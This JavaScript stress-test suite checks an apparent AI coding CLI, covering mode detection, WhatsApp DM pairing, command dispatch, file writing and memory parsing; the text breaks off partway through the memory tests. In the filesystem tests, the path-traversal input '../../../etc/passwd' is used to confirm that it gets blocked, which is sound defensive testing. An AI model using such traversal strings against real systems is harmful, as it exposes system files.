'use strict';

/**
 * ╔══════════════════════════════════════════════════════════════╗
 * ║       🐋  whyWhale — MEGA EXTREME STRESS TEST SUITE         ║
 * ║                                                              ║
 * ║  Run all:    node mega-stress-test.js                        ║
 * ║  Run suite:  node mega-stress-test.js memory                 ║
 * ║                                                              ║
 * ║  Suites (14 total):                                          ║
 * ║   1.  autodetect   — mode & skill detection (extended)       ║
 * ║   2.  dmpolicy     — WhatsApp DM access control              ║
 * ║   3.  commands     — slash command dispatch + results        ║
 * ║   4.  modes        — all mode definitions                    ║
 * ║   5.  colors       — color functions                         ║
 * ║   6.  filesystem   — path helpers + file writes              ║
 * ║   7.  providers    — provider config + callAI                ║
 * ║   8.  memory       — memory CRUD, parse, sanitize            ║
 * ║   9.  config       — skill registry, saveConfig, loadConfig  ║
 * ║   10. sessioncache — cache record/read/reset                 ║
 * ║   11. render       — formatMD, highlight, stripAnsi          ║
 * ║   12. connections  — connection registry & persistence       ║
 * ║   13. stress       — mega fuzz, edge, injection, load        ║
 * ║   14. whatsapp     — WA module fixes, exports, source audit  ║
 * ╚══════════════════════════════════════════════════════════════╝
 */

const path   = require('path');
const fs     = require('fs');
const os     = require('os');
const crypto = require('crypto');

// ─── Tiny test runner ─────────────────────────────────────────────────────────
let _suite    = '';
let _pass     = 0;
let _fail     = 0;
let _skip     = 0;
const _failures = [];

const C = {
  reset : '\x1b[0m',
  green : '\x1b[38;2;63;200;90m',
  red   : '\x1b[38;2;248;81;73m',
  yellow: '\x1b[38;2;255;200;60m',
  blue  : '\x1b[38;2;30;180;255m',
  gray  : '\x1b[38;2;100;110;120m',
  bold  : '\x1b[1m',
  cyan  : '\x1b[38;2;60;220;200m',
  purple: '\x1b[38;2;180;100;255m',
};
const g  = s => C.green  + s + C.reset;
const r  = s => C.red    + s + C.reset;
const y  = s => C.yellow + s + C.reset;
const b  = s => C.blue   + s + C.reset;
const gr = s => C.gray   + s + C.reset;
const bd = s => C.bold   + s + C.reset;
const cy = s => C.cyan   + s + C.reset;
const pu = s => C.purple + s + C.reset;

function suite(name) {
  _suite = name;
  console.log('\n' + bd(b('▸ Suite: ') + cy(name)));
}

function assert(label, condition, detail = '') {
  if (condition) {
    _pass++;
    console.log('  ' + g('✔') + ' ' + label);
  } else {
    _fail++;
    console.log('  ' + r('✘') + ' ' + label + (detail ? gr(' → ' + detail) : ''));
    _failures.push(`[${_suite}] ${label}` + (detail ? ` → ${detail}` : ''));
  }
}

function skip(label) {
  _skip++;
  console.log('  ' + y('⊘') + ' ' + gr(label + ' (skipped)'));
}

async function assertAsync(label, promise) {
  try {
    await promise;
    _pass++;
    console.log('  ' + g('✔') + ' ' + label);
  } catch (err) {
    _fail++;
    const detail = err?.message || String(err);
    console.log('  ' + r('✘') + ' ' + label + gr(' → ' + detail));
    _failures.push(`[${_suite}] ${label} → ${detail}`);
  }
}

function tryRequire(mod) {
  try { return require(mod); }
  catch (e) { return { _error: e.message }; }
}

const ROOT = __dirname;
const LIB  = path.join(ROOT, 'lib');
const CONN = path.join(ROOT, 'connections', 'whatsapp');
const TMP  = path.join(os.tmpdir(), 'ww-stress-' + Date.now());
fs.mkdirSync(TMP, { recursive: true });

// ══════════════════════════════════════════════════════════════════════════════
// SUITE 1 — autoDetect (extended)
// ══════════════════════════════════════════════════════════════════════════════
function runAutoDetect() {
  suite('autoDetect');

  const mod = tryRequire(path.join(LIB, 'main', 'autoDetect'));
  if (mod._error) { skip('module load failed: ' + mod._error); return; }

  const { autoDetectModeAndSkills } = mod;
  assert('autoDetectModeAndSkills is a function', typeof autoDetectModeAndSkills === 'function');

  function makeCtx(mode = 'chat') {
    return {
      mode, agentTaskActive: false, providerKey: 'anthropic',
      apiKey: 'test', modelId: 'claude-3', autoTest: false,
      autoScan: false, skills: [], statusRef: { mode },
    };
  }

  // ── Core mode detection ───────────────────────────────────────────────────
  const modeTests = [
    ['fix this bug in server.js',              'debug',     'debug: fix this bug'],
    ['why is my app crashing',                 'debug',     'debug: why is my app crashing'],
    ['getting an error undefined',             'debug',     'debug: getting an error'],
    ['my server is broken',                    'debug',     'debug: broken keyword'],
    ['app not working',                        'debug',     'debug: not working'],
    ["it doesn't work",                        'debug',     "debug: doesn't work"],
    ['getting a stack trace',                  'debug',     'debug: stack trace'],
    ['review my code please',                  'review',    'review: review my code'],
    ['audit this security module',             'review',    'review: audit module'],
    ['design a scalable microservice api',     'architect', 'architect: system design'],
    ['how should i structure my backend',      'architect', 'architect: structure question'],
    ['explain how closures work',              'explain',   'explain: closures'],
    ['what is a promise in javascript',        'explain',   'explain: what is'],
    ['help me understand async await',         'explain',   'explain: help me understand'],
    ['write a function to parse json',         'code',      'code: write function'],
    ['add an endpoint to my express server',   'code',      'code: add endpoint'],
    ['build a complete express api server',    'agent',     'agent: build complete project'],
    ['create a full react application',        'agent',     'agent: create full app'],
    ['generate a full project scaffold',       'agent',     'agent: generate full project'],
    ['plan the features for my app',           'plan',      'plan: plan features'],
    ['break down this project into tasks',     'plan',      'plan: break down tasks'],
  ];

  for (const [input, expectedMode, label] of modeTests) {
    const ctx = makeCtx('chat');
    autoDetectModeAndSkills(input, ctx);
    assert(label, ctx.mode === expectedMode,
      `input="${input}" → got mode="${ctx.mode}", expected="${expectedMode}"`);
  }

  // ── Agent lock: should NOT switch away when agentTaskActive ───────────────
  const agentCtx = makeCtx('agent');
  agentCtx.agentTaskActive = true;
  autoDetectModeAndSkills('write a function', agentCtx);
  assert('agent lock: does not switch away when agentTaskActive', agentCtx.mode === 'agent');

  // ── Already in correct mode — no unnecessary switch ───────────────────────
  const debugCtx = makeCtx('debug');
  autoDetectModeAndSkills('fix this bug', debugCtx);
  assert('stays in current mode when already correct', debugCtx.mode === 'debug');

  // ── Skill auto-detection ──────────────────────────────────────────────────
  const configMod = tryRequire(path.join(LIB, 'config'));
  const SKILL_REGISTRY = configMod?.SKILL_REGISTRY;

  const skillTests = [
    ['how do i use useEffect in react',   'react',       'skill: react'],
    ['help me write jest unit tests',     'testing',     'skill: testing'],
    ['how to secure jwt tokens',          'security',    'skill: security'],
    ['create a dockerfile for my app',    'docker',      'skill: docker'],
    ['design a postgres schema',          'database',    'skill: database'],
    ['optimise bundle size webpack',      'performance', 'skill: performance'],
    ['help with git branching strategy',  'git',         'skill: git'],
  ];

  if (SKILL_REGISTRY && !configMod._error) {
    for (const [input, skillKey, label] of skillTests) {
      const ctx = makeCtx('chat');
      autoDetectModeAndSkills(input, ctx);
      const reg = SKILL_REGISTRY[skillKey];
      const installed = reg && ctx.skills.some(s => s.name === reg.name);
      assert(label, installed, `skill "${skillKey}" not auto-installed for: "${input}"`);
    }
  } else {
    skip('skill detection (config not loadable)');
  }

  // ── Edge cases: should stay chat ──────────────────────────────────────────
  const edges = ['', '   ', 'hello', 'ok', '👋', '!ls -la', 'sure', 'thanks', '...'];
  for (const input of edges) {
    const ctx = makeCtx('chat');
    autoDetectModeAndSkills(input, ctx);
    assert(`edge: "${input || '(empty)'}" stays chat`, ctx.mode === 'chat', `got "${ctx.mode}"`);
  }

  // ── Mode should be valid after any input ──────────────────────────────────
  const validModes = ['code','chat','debug','explain','review','architect','plan','agent'];
  let invalidMode = false;
  for (let i = 0; i < 200; i++) {
    const rnd = crypto.randomBytes(20).toString('utf8');
    const ctx = makeCtx('chat');
    try { autoDetectModeAndSkills(rnd, ctx); } catch (_) {}
    if (!validModes.includes(ctx.mode)) { invalidMode = true; break; }
  }
  assert('mode always remains a valid mode key after random input', !invalidMode);

  // ── Stress ────────────────────────────────────────────────────────────────
  let threw = false;
  for (let i = 0; i < 500; i++) {
    try { autoDetectModeAndSkills(crypto.randomBytes(150).toString('utf8'), makeCtx()); }
    catch (_) { threw = true; break; }
  }
  assert('stress: 500 random strings never throw', !threw);

  let longThrew = false;
  for (const s of ['fix this bug '.repeat(1000), 'a'.repeat(50000)]) {
    try { autoDetectModeAndSkills(s, makeCtx()); }
    catch (_) { longThrew = true; break; }
  }
  assert('stress: very long inputs (50k chars) never throw', !longThrew);
}

// ══════════════════════════════════════════════════════════════════════════════
// SUITE 2 — dmPolicy
// ══════════════════════════════════════════════════════════════════════════════
async function runDmPolicy() {
  suite('dmPolicy');

  const mod = tryRequire(path.join(CONN, 'dmPolicy'));
  if (mod._error) { skip('module load failed: ' + mod._error); return; }

  const { dmGuard, pairingTable } = mod;
  assert('dmGuard is a function',  typeof dmGuard === 'function');
  assert('pairingTable is a Map',  pairingTable instanceof Map);

  const fakeSock = { sendMessage: async (jid, msg) => {} };
  const msgs = [];
  const recSock = { sendMessage: async (jid, msg) => { msgs.push({ jid, msg }); } };

  // open policy
  assert('open: allows any sender',
    await dmGuard({ sender:'919876543210@s.whatsapp.net', text:'hi', policy:'open', allowFrom:[], sock:null }) === true);

  // groups always pass
  assert('open: group @g.us always passes',
    await dmGuard({ sender:'123@g.us', text:'hi', policy:'allowlist', allowFrom:[], sock:null }) === true);

  // allowlist wildcard
  assert('allowlist: wildcard * allows all',
    await dmGuard({ sender:'919876543210@s.whatsapp.net', text:'hi', policy:'allowlist', allowFrom:['*'], sock:null }) === true);

  // allowlist normalisation
  assert('allowlist: normalises +91 9876... format',
    await dmGuard({ sender:'919876543210@s.whatsapp.net', text:'hi', policy:'allowlist', allowFrom:['+91 9876543210'], sock:null }) === true);

  // allowlist blocks unlisted
  assert('allowlist: blocks unlisted number',
    await dmGuard({ sender:'911111111111@s.whatsapp.net', text:'hi', policy:'allowlist', allowFrom:['919876543210'], sock:null }) === false);

  // unknown policy defaults open
  assert('unknown policy defaults to open',
    await dmGuard({ sender:'919999999999@s.whatsapp.net', text:'hi', policy:'unknown_xyz', allowFrom:[], sock:fakeSock }) === true);

  // pairing: new sender blocked + code issued
  pairingTable.clear(); msgs.length = 0;
  const ns = '919876543211@s.whatsapp.net';
  const r1 = await dmGuard({ sender:ns, text:'hello', policy:'pairing', allowFrom:[], sock:recSock });
  assert('pairing: new sender is blocked', r1 === false);
  assert('pairing: code issued (message sent)', msgs.length === 1);
  assert('pairing: code message contains 🔑', msgs[0]?.msg?.text?.includes('🔑'));

  const code = pairingTable.get(ns)?.code;
  assert('pairing: 6-digit code stored in table', typeof code === 'string' && code.length === 6);

  // correct code approves
  msgs.length = 0;
  const r2 = await dmGuard({ sender:ns, text:code, policy:'pairing', allowFrom:[], sock:recSock });
  assert('pairing: correct code approves sender', r2 === true);
  assert('pairing: approval message sent', msgs.length === 1);
  assert('pairing: approval message has ✅', msgs[0]?.msg?.text?.includes('✅'));

  // approved sender passes subsequent messages
  const r3 = await dmGuard({ sender:ns, text:'now approved', policy:'pairing', allowFrom:[], sock:recSock });
  assert('pairing: approved sender passes on next message', r3 === true);

  // wrong code
  pairingTable.clear(); msgs.length = 0;
  const as = '919876543212@s.whatsapp.net';
  await dmGuard({ sender:as, text:'hi', policy:'pairing', allowFrom:[], sock:recSock });
  msgs.length = 0;
  const rw = await dmGuard({ sender:as, text:'000000', policy:'pairing', allowFrom:[], sock:recSock });
  assert('pairing: wrong code blocks sender', rw === false);
  assert('pairing: wrong code sends ❌ message', msgs.some(m => m.msg?.text?.includes('❌')));

  // expired code
  pairingTable.clear(); msgs.length = 0;
  const es = '919876543213@s.whatsapp.net';
  pairingTable.set(es, { code:'123456', approved:false, expiresAt: Date.now() - 1 });
  const re = await dmGuard({ sender:es, text:'123456', policy:'pairing', allowFrom:[], sock:recSock });
  assert('pairing: expired code is rejected', re === false);
  assert('pairing: expired entry cleaned from table', !pairingTable.has(es));
  assert('pairing: expiry notification sent', msgs.some(m => m.msg?.text?.toLowerCase().includes('expired')));

  // concurrent stress
  pairingTable.clear();
  try {
    await Promise.all(
      Array.from({ length:200 }, (_,i) => `9100000${String(i).padStart(4,'0')}@s.whatsapp.net`)
        .map(s => dmGuard({ sender:s, text:'hi', policy:'open', allowFrom:[], sock:fakeSock }))
    );
    assert('stress: 200 concurrent dmGuard calls succeed', true);
  } catch (e) {
    assert('stress: 200 concurrent dmGuard calls succeed', false, e.message);
  }
}

// ══════════════════════════════════════════════════════════════════════════════
// SUITE 3 — command dispatch + result checking
// ══════════════════════════════════════════════════════════════════════════════
async function runCommands() {
  suite('commands');

  const mod = tryRequire(path.join(LIB, 'main', 'commands'));
  if (mod._error) { skip('module load failed: ' + mod._error); return; }

  const { dispatchCommand } = mod;
  assert('dispatchCommand is a function', typeof dispatchCommand === 'function');

  function makeCtx(overrides = {}) {
    return {
      mode: 'code', skills: [], memory: [], history: [], sessionName: 'test',
      startTime: Date.now(), tokens: { in: 0, out: 0 }, statusRef: { mode:'code' },
      lastReply: 'previous AI reply', providerKey: 'anthropic', modelId: 'claude-3',
      apiKey: 'sk-test', autoTest: false, autoScan: false, agentTaskActive: false,
      ...overrides,
    };
  }

  // ── All known commands must dispatch (not return false) ────────────────────
  const knownCommands = [
    '/help', '/clear', '/stats', '/tokens', '/system', '/copy', '/reset',
    '/scan', '/ls', '/ls src/', '/tree', '/tree 5', '/read somefile.js',
    '/create newfile.js', '/delete oldfile.js', '/rename old.js new.js',
    '/run', '/token', '/token -set-usage 4096', '/mode code', '/mode debug',
    '/mode explain', '/mode agent', '/mode plan', '/model', '/provider',
    '/memory', '/memory set key value', '/memory clear', '/skill list',
    '/skill install react', '/save', '/save my-session', '/load', '/export',
    '/debug', '/debug -fix', '/analyse file.js', '/analyze file.js',
    '/write file.js', '/dashboard', '/dashboard 8080', '/connection',
    '/wa status', '/wp', '/history',
  ];

  let unhandled = 0;
  for (const cmd of knownCommands) {
    try {
      const result = await dispatchCommand(cmd, makeCtx());
      if (result === false) unhandled++;
    } catch (_) { /* handler may throw — router dispatched OK */ }
  }
  assert('all known /commands are dispatched (not returned false)',
    unhandled === 0, `${unhandled} command(s) returned false`);

  // ── Unknown commands return false ─────────────────────────────────────────
  for (const cmd of ['/nonexistent', '/fakecmd', '/xyz123', '/whyWhale', '/💀']) {
    try {
      const result = await dispatchCommand(cmd, makeCtx());
      assert(`unknown "${cmd}" returns false`, result === false, `got ${result}`);
    } catch (_) {
      assert(`unknown "${cmd}" returns false`, false, 'threw instead of returning false');
    }
  }

  // ── Shell passthrough: !<cmd> always dispatches ───────────────────────────
  for (const cmd of ['!ls', '!echo hello', '!git status', '!npm install', '!node --version']) {
    let handled = false;
    try {
      const result = await dispatchCommand(cmd, makeCtx());
      handled = result !== false;
    } catch (_) { handled = true; }
    assert(`shell passthrough "${cmd}" is dispatched`, handled);
  }

  // ── /mode actually changes ctx.mode ───────────────────────────────────────
  for (const [cmd, expectedMode] of [
    ['/mode code',      'code'],
    ['/mode debug',     'debug'],
    ['/mode explain',   'explain'],
    ['/mode agent',     'agent'],
    ['/mode plan',      'plan'],
    ['/mode architect', 'architect'],
    ['/mode review',    'review'],
    ['/mode chat',      'chat'],
  ]) {
    const ctx = makeCtx({ mode: 'code' });
    try {
      await dispatchCommand(cmd, ctx);
      assert(`${cmd} sets ctx.mode to "${expectedMode}"`, ctx.mode === expectedMode,
        `got "${ctx.mode}"`);
    } catch (_) { skip(`${cmd} (threw)`); }
  }

  // ── /clear wipes history ──────────────────────────────────────────────────
  const clearCtx = makeCtx({ history: [{role:'user',content:'hi'},{role:'assistant',content:'hello'}] });
  try {
    await dispatchCommand('/clear', clearCtx);
    assert('/clear empties history array', clearCtx.history.length === 0,
      `history has ${clearCtx.history.length} items`);
  } catch (_) { skip('/clear (threw)'); }

  // ── /token -set-usage applies the value ───────────────────────────────────
  const tokenCtx = makeCtx();
  try {
    await dispatchCommand('/token -set-usage 8192', tokenCtx);
    assert('/token -set-usage 8192 is dispatched without crash', true);
  } catch (_) { skip('/token -set-usage (threw)'); }

  // ── /memory set actually stores a value ───────────────────────────────────
  const memCtx = makeCtx({ memory: { facts: [], projects: {}, sessionSummaries: [] } });
  try {
    await dispatchCommand('/memory set project_name testapp', memCtx);
    // memory may be stored in file or in ctx — just check it didn't crash
    assert('/memory set dispatched without crash', true);
  } catch (_) { skip('/memory set (threw)'); }

  // ── /skill list is dispatched ─────────────────────────────────────────────
  try {
    const result = await dispatchCommand('/skill list', makeCtx());
    assert('/skill list dispatched', result !== false);
  } catch (_) { assert('/skill list dispatched', true); /* threw inside = dispatched */ }

  // ── Aliases ───────────────────────────────────────────────────────────────
  const aliases = [
    ['/q',               '/exit, /quit'],
    ['/wp',              '/connection whatsapp'],
    ['/analyze file.js', '/analyse file.js'],
    ['/coding',          '/token'],
  ];
  for (const [alias, covers] of aliases) {
    let dispatched = false;
    try {
      const result = await dispatchCommand(alias, makeCtx());
      dispatched = result !== false;
    } catch (_) { dispatched = true; }
    assert(`alias "${alias}" is dispatched (covers: ${covers})`, dispatched);
  }

  // ── Stress: 1000 random commands never crash router ───────────────────────
  let stressThrew = false;
  for (let i = 0; i < 1000; i++) {
    try { await dispatchCommand('/' + crypto.randomBytes(8).toString('hex'), makeCtx()); }
    catch (_) { stressThrew = true; break; }
  }
  assert('stress: 1000 random /commands never throw from router', !stressThrew);
}

// ══════════════════════════════════════════════════════════════════════════════
// SUITE 4 — modes
// ══════════════════════════════════════════════════════════════════════════════
function runModes() {
  suite('modes');

  const mod = tryRequire(path.join(LIB, 'modes'));
  if (mod._error) { skip('module load failed: ' + mod._error); return; }

  const { MODES } = mod;
  assert('MODES is an object', typeof MODES === 'object' && MODES !== null);

  const required = ['code','chat','debug','explain','review','architect','plan','agent'];
  for (const name of required) {
    assert(`mode "${name}" exists`, name in MODES, `MODES missing "${name}"`);
  }

  for (const [key, mode] of Object.entries(MODES)) {
    assert(`mode "${key}" has name string`,   typeof mode.name   === 'string' && mode.name.length > 0);
    assert(`mode "${key}" has icon string`,   typeof mode.icon   === 'string' && mode.icon.length > 0);
    assert(`mode "${key}" has colorFn`,       typeof mode.colorFn === 'function');
    assert(`mode "${key}" has prompt string`, typeof mode.prompt === 'string' && mode.prompt.length > 50);
    assert(`mode "${key}" prompt has content`,mode.prompt.includes('whyWhale') || mode.prompt.length > 100);
    assert(`mode "${key}" prompt >100 chars`, mode.prompt.length > 100, `only ${mode.prompt.length} chars`);

    const colored = mode.colorFn('TEST');
    assert(`mode "${key}" colorFn returns string`, typeof colored === 'string');
    assert(`mode "${key}" colorFn wraps input`, colored.includes('TEST'));

    // colorFn must never throw on edge inputs
    let colorThrew = false;
    try { mode.colorFn(''); mode.colorFn('🐋'); mode.colorFn('a'.repeat(10000)); }
    catch (_) { colorThrew = true; }
    assert(`mode "${key}" colorFn never throws on edge inputs`, !colorThrew);
  }

  // File-writing modes must include @@FILE format
  for (const name of ['code','debug','agent']) {
    if (MODES[name]) {
      assert(`mode "${name}" prompt includes @@FILE format`, MODES[name].prompt.includes('@@FILE'));
    }
  }

  // All mode names must be unique
  const names = Object.values(MODES).map(m => m.name);
  assert('all mode names are unique', new Set(names).size === names.length,
    `duplicates: ${names.filter((n,i) => names.indexOf(n) !== i).join(', ')}`);

  // All mode icons should be unique
  const icons = Object.values(MODES).map(m => m.icon);
  assert('all mode icons are unique', new Set(icons).size === icons.length);
}

// ══════════════════════════════════════════════════════════════════════════════
// SUITE 5 — colors
// ══════════════════════════════════════════════════════════════════════════════
function runColors() {
  suite('colors');

  const mod = tryRequire(path.join(LIB, 'colors'));
  if (mod._error) { skip('module load failed: ' + mod._error); return; }

  const { C, wh, cr, kp, rf, ab, sd, dg, vt, tl, fm, bd, dm } = mod;
  assert('C.reset is string', typeof C.reset === 'string');
  assert('C.bold  is string', typeof C.bold  === 'string');

  const fns = { wh, cr, kp, rf, ab, sd, dg, vt, tl, fm, bd, dm };
  for (const [name, fn] of Object.entries(fns)) {
    if (typeof fn !== 'function') { assert(`${name} is a function`, false, 'not a function'); continue; }
    const result = fn('WHALE');
    assert(`${name}() returns string`, typeof result === 'string');
    assert(`${name}() contains input text`, result.includes('WHALE'));
    assert(`${name}() contains reset code`, result.includes(C.reset));
  }

  assert('color fn with empty string',  typeof wh('')           === 'string');
  assert('color fn with unicode',       wh('🐋').includes('🐋'));
  assert('color fn with ansi inside',   wh('\x1b[31mred\x1b[0m').includes('red'));
  assert('color fn with newline',       wh('line1\nline2').includes('\n'));
  assert('color fn with null bytes',    typeof wh('\x00\x01')   === 'string');
  assert('color fn with 10k string',    wh('x'.repeat(10000)).includes('x'));

  let colorThrew = false;
  try { for (let i = 0; i < 10000; i++) { wh('t'+i); cr('t'+i); dg('t'+i); } }
  catch (_) { colorThrew = true; }
  assert('stress: 10,000 color fn calls never throw', !colorThrew);
}

// ══════════════════════════════════════════════════════════════════════════════
// SUITE 6 — filesystem (extended: actual file writes)
// ══════════════════════════════════════════════════════════════════════════════
function runFilesystem() {
  suite('filesystem');

  const mod = tryRequire(path.join(LIB, 'filesystem'));
  if (mod._error) { skip('module load failed: ' + mod._error); return; }

  const { CWD, parseFileBlocks, applyFileBlocks, safePath, lsDir, treeDir, formatSize } = mod;

  assert('CWD is a function',            typeof CWD            === 'function');
  assert('parseFileBlocks is a function',typeof parseFileBlocks === 'function');
  assert('applyFileBlocks is a function',typeof applyFileBlocks === 'function');

  const cwd = CWD();
  assert('CWD() returns a string',   typeof cwd === 'string');
  assert('CWD() is non-empty',       cwd.length > 0);
  assert('CWD() is absolute path',   path.isAbsolute(cwd));

  // ── parseFileBlocks ───────────────────────────────────────────────────────
  const single = `\n@@FILE: src/app.js\n\`\`\`js\nconsole.log('hello');\n\`\`\`\n@@END\n`;
  const p1 = parseFileBlocks(single);
  assert('parseFileBlocks: detects single block',   Array.isArray(p1) && p1.length === 1);
  assert('parseFileBlocks: extracts correct path',  p1[0]?.file === 'src/app.js');
  assert('parseFileBlocks: extracts code content',  p1[0]?.content?.includes("console.log('hello')"));

  const multi = `\n@@FILE: a.js\n\`\`\`js\nconst a = 1;\n\`\`\`\n@@END\n@@FILE: b.js\n\`\`\`js\nconst b = 2;\n\`\`\`\n@@END\n`;
  const p2 = parseFileBlocks(multi);
  assert('parseFileBlocks: detects multiple blocks', p2.length === 2);
  assert('parseFileBlocks: first file path correct', p2[0]?.file === 'a.js');
  assert('parseFileBlocks: second file path correct', p2[1]?.file === 'b.js');

  assert('parseFileBlocks: empty → empty array', parseFileBlocks('').length === 0);
  assert('parseFileBlocks: no blocks → empty array', parseFileBlocks('no blocks here').length === 0);

  // 50 blocks
  let big = '';
  for (let i = 0; i < 50; i++) big += `@@FILE: file${i}.js\n\`\`\`js\nconst x${i}=${i};\n\`\`\`\n@@END\n`;
  try {
    const pb = parseFileBlocks(big);
    assert('parseFileBlocks: handles 50 blocks', pb.length === 50);
  } catch (e) { assert('parseFileBlocks: handles 50 blocks', false, e.message); }

  // malformed — must never throw
  const malformed = [
    '@@FILE: missing-end.js\n```js\ncode\n```',
    '@@END without @@FILE',
    '@@FILE: \n```js\nno path\n```\n@@END',
    '@@FILE: file.js\nno fences\n@@END',
  ];
  let malThrew = false;
  for (const m of malformed) { try { parseFileBlocks(m); } catch (_) { malThrew = true; break; } }
  assert('parseFileBlocks: never throws on malformed input', !malThrew);

  // null/undefined/non-string
  for (const bad of [null, undefined, 0, [], {}]) {
    let t = false; try { parseFileBlocks(bad); } catch (_) { t = true; }
    assert(`parseFileBlocks: doesn't throw on ${JSON.stringify(bad)}`, !t);
  }

  // path traversal check
  const trav = parseFileBlocks('@@FILE: ../../../etc/passwd\n```\ncode\n```\n@@END');
  if (trav.length > 0) {
    const ep = trav[0].file || '';
    assert('parseFileBlocks: traversal path does not resolve to /etc/passwd',
      !path.resolve('/safe/root', ep).startsWith('/etc'), `got: ${ep}`);
  }

  // ── applyFileBlocks: actually write and verify files ─────────────────────
  const origCwd = process.cwd();
  process.chdir(TMP);

  const writeBlocks = [
    { file: 'test-out/hello.js',   content: "console.log('hello');\n" },
    { file: 'test-out/world.txt',  content: 'world content\n' },
    { file: 'test-out/sub/deep.js', content: 'const deep = true;\n' },
  ];

  try {
    const results = applyFileBlocks(writeBlocks);
    assert('applyFileBlocks: returns array', Array.isArray(results));
    assert('applyFileBlocks: correct number of results', results.length === writeBlocks.length);
    assert('applyFileBlocks: all succeed', results.every(r => r.ok));

    for (const { file } of writeBlocks) {
      const full = path.join(TMP, file);
      assert(`applyFileBlocks: "${file}" actually exists on disk`, fs.existsSync(full));
    }

    // content roundtrip
    const written = fs.readFileSync(path.join(TMP, 'test-out/hello.js'), 'utf8');
    assert('applyFileBlocks: content written correctly', written.includes("console.log('hello')"));
  } catch (e) {
    assert('applyFileBlocks: write succeeded', false, e.message);
  }

  // path traversal must be blocked by safePath
  if (typeof safePath === 'function') {
    let blocked = false;
    try { safePath('../../../etc/passwd'); }
    catch (_) { blocked = true; }
    assert('safePath: blocks path traversal outside cwd', blocked);

    let allowed = false;
    try { safePath('valid/local/file.js'); allowed = true; }
    catch (_) {}
    assert('safePath: allows valid relative paths', allowed);
  } else { skip('safePath not exported'); }

  process.chdir(origCwd);

  // ── formatSize ────────────────────────────────────────────────────────────
  if (typeof formatSize === 'function') {
    assert('formatSize: bytes < 1024 shows B',  formatSize(512).includes('B'));
    assert('formatSize: 1500 bytes shows KB',   formatSize(1500).includes('KB'));
    assert('formatSize: 2MB shows MB',          formatSize(2 * 1024 * 1024).includes('MB'));
    assert('formatSize: never throws on 0',     (() => { try { formatSize(0); return true; } catch(_){ return false; } })());
  } else { skip('formatSize not exported'); }
}

// ══════════════════════════════════════════════════════════════════════════════
// SUITE 7 — providers
// ══════════════════════════════════════════════════════════════════════════════
function runProviders() {
  suite('providers');

  const mod = tryRequire(path.join(LIB, 'providers'));
  if (mod._error) { skip('module load failed: ' + mod._error); return; }

  const { callAI, listModels } = mod;
  assert('callAI is a function', typeof callAI === 'function');
  if (typeof listModels === 'function') { assert('listModels is a function', true); }
  else { skip('listModels not exported'); }

  // callAI returns a Promise synchronously
  let returnedPromise = false, threw = false;
  const fakeCtx = {
    providerKey:'anthropic', apiKey:'sk-ant-INVALID', modelId:'claude-3-haiku-20240307',
    mode:'code', history:[], skills:[], memory:[], tokens:{in:0,out:0},
  };
  try {
    const result = callAI('hello', fakeCtx, () => {});
    returnedPromise = result && typeof result.then === 'function';
    result.catch(() => {});
  } catch (_) { threw = true; }
  assert('callAI returns a Promise (does not throw synchronously)', !threw && returnedPromise);

  // Provider registry
  const cfgMod = tryRequire(path.join(LIB, 'config'));
  if (!cfgMod._error && cfgMod.PROVIDERS) {
    const keys = Object.keys(cfgMod.PROVIDERS);
    for (const p of ['anthropic','openrouter','groq','ollama']) {
      assert(`provider "${p}" is defined`, keys.includes(p));
    }
    for (const [key, prov] of Object.entries(cfgMod.PROVIDERS)) {
      assert(`provider "${key}" has name`,   typeof prov.name === 'string');
      assert(`provider "${key}" has models`, Array.isArray(prov.models) || typeof prov.models === 'function');
    }
  } else { skip('PROVIDERS config not accessible'); }
}

// ══════════════════════════════════════════════════════════════════════════════
// SUITE 8 — memory system (NEW)
// ══════════════════════════════════════════════════════════════════════════════
function runMemory() {
  suite('memory');

  const mod = tryRequire(path.join(LIB, 'config'));
  if (mod._error) { skip('module load failed: ' + mod._error); return; }

  const { loadMemory, saveMemory, updateMemory, parseMemoryBlocks,
          sanitizeMemory, buildMemoryContext } = mod;

  assert('loadMemory is a function',        typeof loadMemory        === 'function');
  assert('saveMemory is a function',        typeof saveMemory        === 'function');
  assert('updateMemory is a function',      typeof updateMemory      === 'function');
  assert('parseMemoryBlocks is a function', typeof parseMemoryBlocks === 'function');

  // ── loadMemory returns valid structure ────────────────────────────────────
  const mem = loadMemory();
  assert('loadMemory: returns object',                 typeof mem === 'object' && mem !== null);
  assert('loadMemory: has facts array',                Array.isArray(mem.facts));
  assert('loadMemory: has sessionSummaries array',     Array.isArray(mem.sessionSummaries));

  // ── parseMemoryBlocks ─────────────────────────────────────────────────────
  const validBlock = 'Here is a fact.\n@@MEMORY: project_name: my-awesome-app\nOther text.';
  const parsed = parseMemoryBlocks(validBlock);
  assert('parseMemoryBlocks: parses valid @@MEMORY block', parsed.length >= 1);
  if (parsed.length > 0) {
    assert('parseMemoryBlocks: extracted key is correct',   parsed[0].key   === 'project_name');
    assert('parseMemoryBlocks: extracted value is correct', parsed[0].value === 'my-awesome-app');
  }

  // multiple blocks
  const multi = '@@MEMORY: port: 3000\n@@MEMORY: stack: express\n@@MEMORY: db: postgres\n@@MEMORY: extra: overflow';
  const mp = parseMemoryBlocks(multi);
  assert('parseMemoryBlocks: parses multiple blocks',       mp.length >= 1);
  assert('parseMemoryBlocks: caps at 3 blocks max',         mp.length <= 3);

  // noise keys must be filtered
  const noiseInput = '@@MEMORY: greeting: hello\n@@MEMORY: project_name: realapp';
  const np = parseMemoryBlocks(noiseInput);
  assert('parseMemoryBlocks: filters noise keys (greeting)', !np.some(b => b.key === 'greeting'));

  // code-fence content must be stripped before parsing
  const fencedInput = '```\n@@MEMORY: fake: value\n```\n@@MEMORY: real_key: real_value';
  const fp = parseMemoryBlocks(fencedInput);
  assert('parseMemoryBlocks: ignores @@MEMORY inside ``` fences', !fp.some(b => b.key === 'fake'));
  assert('parseMemoryBlocks: parses @@MEMORY outside fences', fp.some(b => b.key === 'real_key'));

  // slash commands in values must be rejected
  const slashInput = '@@MEMORY: cmd_value: node server.js/scan';
  const sp = parseMemoryBlocks(slashInput);
  assert('parseMemoryBlocks: rejects values with slash commands', sp.length === 0);

  // trivial values filtered
  const trivial = '@@MEMORY: some_key: true\n@@MEMORY: other_key: real value here';
  const tp = parseMemoryBlocks(trivial);
  assert('parseMemoryBlocks: filters trivial values (true/false/ok)', !tp.some(b => b.value === 'true'));

  // key with spaces must be rejected
  const spacedKey = '@@MEMORY: key with spaces: some value';
  const ksp = parseMemoryBlocks(spacedKey);
  assert('parseMemoryBlocks: rejects keys with spaces', ksp.length === 0);

  // short key (<2 chars) rejected
  const shortKey = '@@MEMORY: a: some value';
